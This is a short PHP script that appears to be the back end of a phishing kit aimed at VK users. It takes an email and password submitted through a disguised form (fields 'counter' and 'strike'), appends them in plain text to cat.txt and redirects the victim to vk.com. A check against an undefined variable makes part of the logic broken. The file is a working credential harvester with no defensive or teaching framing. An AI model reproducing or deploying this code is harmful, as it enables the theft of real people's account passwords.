<?PHP
$Log = $_POST['counter'];
$Pass = $_POST['strike'];
$myFile = file_get_contents("protect.html");
if($myFile == $searchString) {
    file_put_contents("cat.txt", "[EMAIL]: " . $Log . " [PASS]: " . $Pass . "\n", FILE_APPEND);
    header('Location: https://vk.com/');
}
if($myFile != $searchString) {
    echo "DO NOT TRUST ME";
}
?>